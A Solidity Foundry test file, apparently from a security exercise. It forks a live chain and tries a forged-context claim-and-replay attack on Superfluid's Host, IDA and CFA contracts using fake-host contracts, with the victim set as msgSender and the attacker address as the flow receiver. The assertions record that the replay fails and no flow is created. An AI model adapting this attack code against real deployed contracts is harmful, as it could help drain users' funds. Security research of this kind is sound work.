// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement39 {}

interface ISuperfluidHost39 {
    function callAgreement(
        ISuperAgreement39 agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function callAgreementWithContext(
        ISuperAgreement39 agreementClass,
        bytes calldata callData,
        bytes calldata userData,
        bytes calldata ctx
    ) external returns (bytes memory newCtx, bytes memory returnedData);

    function isCtxValid(bytes calldata ctx) external view returns (bool);
}

interface IInstantDistributionAgreementV139 is ISuperAgreement39 {
    function createIndex(address token, uint32 indexId, bytes calldata ctx) external returns (bytes memory newCtx);

    function updateSubscription(
        address token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(address token, uint32 indexId, uint128 indexValue, bytes calldata ctx)
        external
        returns (bytes memory newCtx);

    function claim(address token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx)
        external
        returns (bytes memory newCtx);

    function getSubscription(address token, address publisher, uint32 indexId, address subscriber)
        external
        view
        returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface ILegacyCFA39 is ISuperAgreement39 {
    function createFlow(address token, address receiver, int96 flowRate, bytes calldata ctx)
        external
        returns (bytes memory newCtx);

    function getFlow(address token, address sender, address receiver)
        external
        view
        returns (uint256 timestamp, int96 flowRate, uint256 deposit, uint256 owedDeposit);
}

interface IMATICx39 {
    function upgradeByETH() external payable;
}

abstract contract DirectClaimBase39 {
    address internal constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address internal constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address internal constant CFA = 0x6EeE6060f715257b970700bc2656De21dEdF074C;
    address internal constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;

    address public immutable attackerEOA;

    bool public claimSucceeded;
    bool public replaySucceeded;
    bool public realHostCtxValidAfterClaim;

    bytes public claimReturnedCtx;
    bytes public replayReturnedCtx;
    bytes public replayReturnedData;
    string public claimRevert;
    string public replayRevert;

    constructor(address attackerEOA_) payable {
        attackerEOA = attackerEOA_;
    }

    receive() external payable {}

    function seedPendingClaim(uint32 indexId, address subscriber, uint128 distributionAmount) external {
        require(address(this).balance >= distributionAmount, "insufficient native seed");

        IMATICx39(MATICX).upgradeByETH{value: distributionAmount}();

        ISuperfluidHost39(HOST).callAgreement(
            ISuperAgreement39(IDA),
            abi.encodeCall(IInstantDistributionAgreementV139.createIndex, (MATICX, indexId, new bytes(0))),
            new bytes(0)
        );

        ISuperfluidHost39(HOST).callAgreement(
            ISuperAgreement39(IDA),
            abi.encodeCall(
                IInstantDistributionAgreementV139.updateSubscription,
                (MATICX, indexId, subscriber, uint128(1), new bytes(0))
            ),
            new bytes(0)
        );

        ISuperfluidHost39(HOST).callAgreement(
            ISuperAgreement39(IDA),
            abi.encodeCall(IInstantDistributionAgreementV139.updateIndex, (MATICX, indexId, distributionAmount, new bytes(0))),
            new bytes(0)
        );
    }

    function runDirectClaimAndRealHostReplay(uint32 indexId, address subscriber, bytes calldata forgedCtx) external {
        _resetRuntimeState();

        (bool claimOk, bytes memory claimRet) = IDA.call(
            abi.encodeCall(IInstantDistributionAgreementV139.claim, (MATICX, address(this), indexId, subscriber, forgedCtx))
        );

        if (!claimOk) {
            claimRevert = _decodeRevert(claimRet);
            return;
        }

        claimSucceeded = true;
        claimReturnedCtx = abi.decode(claimRet, (bytes));

        bytes memory replayCtx = _replayCtx();
        realHostCtxValidAfterClaim = ISuperfluidHost39(HOST).isCtxValid(replayCtx);

        bytes memory replayCallData =
            abi.encodeCall(ILegacyCFA39.createFlow, (MATICX, attackerEOA, int96(1), new bytes(0)));

        (bool replayOk, bytes memory replayRet) = HOST.call(
            abi.encodeCall(
                ISuperfluidHost39.callAgreementWithContext,
                (ISuperAgreement39(CFA), replayCallData, new bytes(0), replayCtx)
            )
        );

        replaySucceeded = replayOk;
        if (replayOk) {
            (replayReturnedCtx, replayReturnedData) = abi.decode(replayRet, (bytes, bytes));
        } else {
            replayRevert = _decodeRevert(replayRet);
        }
    }

    function _resetRuntimeState() internal {
        claimSucceeded = false;
        replaySucceeded = false;
        realHostCtxValidAfterClaim = false;
        claimRevert = "";
        replayRevert = "";
        delete claimReturnedCtx;
        delete replayReturnedCtx;
        delete replayReturnedData;
        _resetImplementationState();
    }

    function _replayCtx() internal view virtual returns (bytes memory);

    function _resetImplementationState() internal virtual;

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            return revertData.length == 0 ? "silent revert" : string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}

/// @notice Minimal echo fake-host. Direct claim succeeds here because the
/// callback helpers just bounce ctx through without attempting real Host-like
/// frame management.
contract EchoFakeHost39 is DirectClaimBase39 {
    uint256 public pushCalls;
    uint256 public popCalls;
    uint256 public beforeCalls;
    uint256 public afterCalls;

    bytes public lastPushedCtx;
    bytes public lastPoppedCtx;
    bytes public lastBeforeCallbackCtx;
    bytes public lastAfterCallbackCtx;

    constructor(address attackerEOA_) DirectClaimBase39(attackerEOA_) {}

    function getAppManifest(address) external pure returns (bool, bool, uint256) {
        return (true, false, 0);
    }

    function isApp(address) external pure returns (bool) {
        return true;
    }

    function isCtxValid(bytes calldata) external pure returns (bool) {
        return true;
    }

    function decodeCtx(bytes memory)
        external
        pure
        returns (
            uint8,
            uint8,
            uint256,
            address,
            bytes4,
            bytes memory,
            uint256,
            uint256,
            int256,
            address,
            address
        )
    {
        return (0, 1, 0, address(0), bytes4(0), "", 0, 0, 0, address(0), address(0));
    }

    function appCallbackPush(bytes calldata ctx, address, uint256, int256, address) external returns (bytes memory) {
        pushCalls += 1;
        lastPushedCtx = ctx;
        return ctx;
    }

    function appCallbackPop(bytes calldata ctx, int256) external returns (bytes memory) {
        popCalls += 1;
        lastPoppedCtx = ctx;
        return ctx;
    }

    function callAppBeforeCallback(address, bytes calldata, bool, bytes calldata ctx) external returns (bytes memory cbdata) {
        beforeCalls += 1;
        lastBeforeCallbackCtx = ctx;
        cbdata = abi.encodePacked(uint256(0x39));
    }

    function callAppAfterCallback(address, bytes calldata, bool, bytes calldata ctx)
        external
        returns (bytes memory newCtx)
    {
        afterCalls += 1;
        lastAfterCallbackCtx = ctx;
        newCtx = ctx;
    }

    function _replayCtx() internal view override returns (bytes memory) {
        return lastPoppedCtx;
    }

    function _resetImplementationState() internal override {
        pushCalls = 0;
        popCalls = 0;
        beforeCalls = 0;
        afterCalls = 0;
        delete lastPushedCtx;
        delete lastPoppedCtx;
        delete lastBeforeCallbackCtx;
        delete lastAfterCallbackCtx;
    }
}

/// @notice Host-like fake-host. This tries to mirror real `appCallbackPush`,
/// `decodeCtx`, and `appCallbackPop` semantics. On the live fork, that path
/// makes direct claim revert before any real Host replay becomes possible.
contract StampedFakeHost39 is DirectClaimBase39 {
    bytes32 public localCtxStamp;
    bytes public lastPoppedCtx;

    constructor(address attackerEOA_) DirectClaimBase39(attackerEOA_) {}

    function getAppManifest(address app) external view returns (bool, bool, uint256) {
        return (app == address(this), false, 0);
    }

    function isCtxValid(bytes calldata ctx) external view returns (bool) {
        return ctx.length != 0 && keccak256(ctx) == localCtxStamp;
    }

    function decodeCtx(bytes memory ctx)
        external
        pure
        returns (
            uint8 appCallbackLevel,
            uint8 callType,
            uint256 timestamp,
            address msgSender,
            bytes4 agreementSelector,
            bytes memory userData,
            uint256 appCreditGranted,
            uint256 appCreditWantedDeprecated,
            int256 appCreditUsed,
            address appAddress,
            address appCreditToken
        )
    {
        ContextUtils.Context memory context = ContextUtils.decodeContext(ctx);
        return (
            context.appCallbackLevel,
            context.callType,
            context.timestamp,
            context.msgSender,
            context.agreementSelector,
            context.userData,
            context.appCreditGranted,
            context.appCreditWantedDeprecated,
            context.appCreditUsed,
            context.appAddress,
            context.appCreditToken
        );
    }

    function appCallbackPush(
        bytes calldata ctx,
        address app,
        uint256 appAllowanceGranted,
        int256 appAllowanceUsed,
        address appAllowanceToken
    ) external returns (bytes memory appCtx) {
        ContextUtils.Context memory context = ContextUtils.decodeContext(ctx);
        context.appCallbackLevel += 1;
        context.callType = ContextUtils.CALL_TYPE_APP_CALLBACK;
        context.appCreditGranted = appAllowanceGranted;
        context.appCreditWantedDeprecated = 0;
        context.appCreditUsed = appAllowanceUsed;
        context.appAddress = app;
        context.appCreditToken = appAllowanceToken;

        appCtx = ContextUtils.encodeContext(context);
        localCtxStamp = keccak256(appCtx);
    }

    function appCallbackPop(bytes calldata ctx, int256 appAllowanceUsedDelta) external returns (bytes memory newCtx) {
        ContextUtils.Context memory context = ContextUtils.decodeContext(ctx);
        context.appCreditUsed += appAllowanceUsedDelta;
        newCtx = ContextUtils.encodeContext(context);

        lastPoppedCtx = newCtx;
        localCtxStamp = keccak256(newCtx);
    }

    function callAppBeforeCallback(address, bytes calldata, bool, bytes calldata) external pure returns (bytes memory cbdata) {
        return cbdata;
    }

    function callAppAfterCallback(address, bytes calldata, bool, bytes calldata ctx)
        external
        pure
        returns (bytes memory newCtx)
    {
        return ctx;
    }

    function _replayCtx() internal view override returns (bytes memory) {
        return lastPoppedCtx;
    }

    function _resetImplementationState() internal override {
        localCtxStamp = bytes32(0);
        delete lastPoppedCtx;
    }
}

contract Attempt39 is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant VICTIM = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;

    address internal constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address internal constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address internal constant CFA = 0x6EeE6060f715257b970700bc2656De21dEdF074C;
    address internal constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;

    uint32 internal constant INDEX_ID_ECHO = 390_001;
    uint32 internal constant INDEX_ID_STAMPED = 390_011;
    uint128 internal constant DISTRIBUTION_AMOUNT = 1 ether;
    bytes32 internal constant HOST_CTX_STAMP_SLOT = bytes32(uint256(6));

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
        vm.label(ATTACKER, "StudentEOA");
        vm.label(VICTIM, "ForgedMsgSenderVictim");
        vm.label(HOST, "RealHost");
        vm.label(IDA, "IDAProxy");
        vm.label(CFA, "CFAProxy");
        vm.label(MATICX, "MATICx");
    }

    function test_echo_fake_host_direct_claim_returns_but_real_host_stamp_stays_zero() public {
        address subscriber = makeAddr("attempt39_echo_subscriber");
        vm.label(subscriber, "Attempt39EchoSubscriber");

        EchoFakeHost39 fakeHost = new EchoFakeHost39(ATTACKER);
        vm.label(address(fakeHost), "Attempt39EchoFakeHost");
        vm.deal(address(fakeHost), DISTRIBUTION_AMOUNT);

        fakeHost.seedPendingClaim(INDEX_ID_ECHO, subscriber, DISTRIBUTION_AMOUNT);

        (bool exist, bool approved, uint128 units, uint256 pendingBefore) =
            IInstantDistributionAgreementV139(IDA).getSubscription(MATICX, address(fakeHost), INDEX_ID_ECHO, subscriber);

        console.log("[echo seed] exist:", exist);
        console.log("[echo seed] approved:", approved);
        console.log("[echo seed] units:", uint256(units));
        console.log("[echo seed] pending before:", pendingBefore);

        assertTrue(exist, "seeded subscription must exist");
        assertFalse(approved, "seeded tuple must stay unapproved");
        assertEq(units, 1, "echo host should seed one unit");
        assertEq(pendingBefore, DISTRIBUTION_AMOUNT, "pending distribution mismatch");

        bytes memory forgedCtx = _buildForgedClaimContext(address(fakeHost));
        ContextUtils.Context memory forged = ContextUtils.decodeContext(forgedCtx);

        console.log("[echo forged] msgSender:", forged.msgSender);
        console.log("[echo forged] appAddress:", forged.appAddress);
        console.log("[echo forged] appCreditToken:", forged.appCreditToken);
        console.log("[echo forged] appCreditGranted:", forged.appCreditGranted);

        bytes32 hostStampBefore = vm.load(HOST, HOST_CTX_STAMP_SLOT);
        console.logBytes32(hostStampBefore);
        assertEq(uint256(hostStampBefore), 0, "real host ctx slot should start clean");

        fakeHost.runDirectClaimAndRealHostReplay(INDEX_ID_ECHO, subscriber, forgedCtx);

        bytes32 hostStampAfter = vm.load(HOST, HOST_CTX_STAMP_SLOT);
        console.logBytes32(hostStampAfter);

        bytes memory returnedCtx = fakeHost.claimReturnedCtx();
        ContextUtils.Context memory returned = ContextUtils.decodeContext(returnedCtx);

        console.log("[echo claim] claimSucceeded:", fakeHost.claimSucceeded());
        console.log("[echo claim] claimRevert:", fakeHost.claimRevert());
        console.log("[echo claim] pushCalls:", fakeHost.pushCalls());
        console.log("[echo claim] popCalls:", fakeHost.popCalls());
        console.log("[echo claim] beforeCalls:", fakeHost.beforeCalls());
        console.log("[echo claim] afterCalls:", fakeHost.afterCalls());
        console.log("[echo claim] realHostCtxValidAfterClaim:", fakeHost.realHostCtxValidAfterClaim());
        console.log("[echo claim] replaySucceeded:", fakeHost.replaySucceeded());
        console.log("[echo claim] replayRevert:", fakeHost.replayRevert());

        console.log("[echo returned] appAddress:", returned.appAddress);
        console.log("[echo returned] appCreditToken:", returned.appCreditToken);
        console.log("[echo returned] appCreditGranted:", returned.appCreditGranted);
        console.logInt(returned.appCreditUsed);

        (,,, uint256 pendingAfter) =
            IInstantDistributionAgreementV139(IDA).getSubscription(MATICX, address(fakeHost), INDEX_ID_ECHO, subscriber);
        (uint256 flowTimestamp, int96 flowRate,,) = ILegacyCFA39(CFA).getFlow(MATICX, address(fakeHost), ATTACKER);

        console.log("[echo claim] pending after:", pendingAfter);
        console.log("[echo replay] flow timestamp:", flowTimestamp);
        console.log("[echo replay] flow rate:", int256(flowRate));

        assertTrue(fakeHost.claimSucceeded(), "direct claim should succeed on the minimal echo fake-host path");
        assertEq(fakeHost.pushCalls(), 2, "echo path should push twice");
        assertEq(fakeHost.popCalls(), 2, "echo path should pop twice");
        assertEq(fakeHost.beforeCalls(), 1, "echo path should hit before callback once");
        assertEq(fakeHost.afterCalls(), 1, "echo path should hit after callback once");

        assertEq(uint256(hostStampAfter), 0, "real host ctx slot must stay untouched");
        assertFalse(fakeHost.realHostCtxValidAfterClaim(), "echo-returned ctx must not validate on the real host");
        assertFalse(fakeHost.replaySucceeded(), "real host replay must fail");
        assertEq(fakeHost.replayRevert(), "SF: APP_RULE_CTX_IS_NOT_VALID", "unexpected real-host replay revert");

        assertEq(returned.appAddress, forged.appAddress, "claim return should preserve forged appAddress");
        assertEq(returned.appCreditToken, forged.appCreditToken, "claim return should preserve forged token");
        assertEq(returned.appCreditGranted, forged.appCreditGranted, "claim return should preserve forged grant");
        assertEq(returned.appCreditUsed, forged.appCreditUsed, "claim return should preserve forged used");
        assertEq(returnedCtx, forgedCtx, "echo fake-host should surface the exact forged ctx bytes");
        assertEq(fakeHost.lastPoppedCtx(), forgedCtx, "captured pop ctx should equal the forged ctx bytes");

        assertEq(pendingAfter, 0, "claim should consume the pending distribution");
        assertEq(flowTimestamp, 0, "real host replay must not create a flow");
        assertEq(flowRate, 0, "real host replay must not create a flow");
    }

    function test_host_like_stamp_emulation_reverts_before_real_host_can_validate_ctx() public {
        address subscriber = makeAddr("attempt39_stamped_subscriber");
        vm.label(subscriber, "Attempt39StampedSubscriber");

        StampedFakeHost39 stampedHost = new StampedFakeHost39(ATTACKER);
        vm.label(address(stampedHost), "Attempt39StampedFakeHost");
        vm.deal(address(stampedHost), DISTRIBUTION_AMOUNT);

        stampedHost.seedPendingClaim(INDEX_ID_STAMPED, subscriber, DISTRIBUTION_AMOUNT);

        bytes memory forgedCtx = _buildForgedClaimContext(address(stampedHost));
        bytes32 hostStampBefore = vm.load(HOST, HOST_CTX_STAMP_SLOT);

        stampedHost.runDirectClaimAndRealHostReplay(INDEX_ID_STAMPED, subscriber, forgedCtx);

        bytes32 hostStampAfter = vm.load(HOST, HOST_CTX_STAMP_SLOT);

        console.log("[stamped claim] claimSucceeded:", stampedHost.claimSucceeded());
        console.log("[stamped claim] claimRevert:", stampedHost.claimRevert());
        console.logBytes32(hostStampBefore);
        console.logBytes32(hostStampAfter);

        assertFalse(
            stampedHost.claimSucceeded(),
            "a host-like fake-host that restamps ctx locally should revert during direct claim"
        );
        assertGt(bytes(stampedHost.claimRevert()).length, 0, "reverted host-like path should report some failure text");
        assertEq(uint256(hostStampBefore), 0, "real host ctx slot should start clean");
        assertEq(uint256(hostStampAfter), 0, "real host ctx slot should remain clean after the reverted path");
    }

    function _buildForgedClaimContext(address appAddress) internal view returns (bytes memory) {
        ContextUtils.Context memory context =
            ContextUtils.buildContext(VICTIM, IInstantDistributionAgreementV139.claim.selector, bytes("attempt39"));
        context.appCreditGranted = type(uint128).max;
        context.appCreditUsed = 0;
        context.appAddress = appAddress;
        context.appCreditToken = MATICX;
        return ContextUtils.encodeContext(context);
    }
}
